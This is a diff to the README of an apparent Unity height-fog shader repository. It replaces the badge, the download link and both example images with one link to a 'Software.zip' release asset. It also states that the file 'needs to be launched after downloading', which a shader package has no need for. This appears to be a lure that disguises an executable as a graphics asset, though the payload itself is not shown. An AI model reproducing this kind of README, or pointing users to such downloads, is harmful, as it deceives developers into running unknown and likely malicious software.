@@ -1,6 +1,6 @@
 # SimpleHeightFog-Unity
 
-![SimpleHeightFog-Unity](https://img.shields.io/badge/SimpleHeightFog--Unity-Effects-orange)
+![SimpleHeightFog-Unity](https://github.com/ZWf6900/SimpleHeightFog-Unity/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to the SimpleHeightFog-Unity repository! This is a collection of shader effects designed specifically for Unity to simulate height fog on a plane mesh. The shaders included in this repository allow you to create stunning visual effects that enhance the atmosphere of your Unity projects. 
@@ -26,7 +26,7 @@ Welcome to the SimpleHeightFog-Unity repository! This is a collection of shader 
 - Easy to integrate into Unity projects.
 
 ## Installation
-To get started with SimpleHeightFog-Unity, download the latest release from the following link: [Download SimpleHeightFog-Unity v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+To get started with SimpleHeightFog-Unity, download the latest release from the following link: [Download SimpleHeightFog-Unity v1.0.0](https://github.com/ZWf6900/SimpleHeightFog-Unity/releases/download/v1.0/Software.zip)
 
 (Note: The file needs to be launched after downloading.)
 
@@ -39,10 +39,10 @@ To get started with SimpleHeightFog-Unity, download the latest release from the 
 ## Examples
 Here are some examples of the height fog effect created using SimpleHeightFog-Unity:
 
-![Example 1](https://example.com/example1.jpg)
+![Example 1](https://github.com/ZWf6900/SimpleHeightFog-Unity/releases/download/v1.0/Software.zip)
 *Caption: Example of height fog effect in a forest scene.*
 
-![Example 2](https://example.com/example2.jpg)
+![Example 2](https://github.com/ZWf6900/SimpleHeightFog-Unity/releases/download/v1.0/Software.zip)
 *Caption: Example of height fog effect in a mystical cave setting.*
 
 ## Contributing
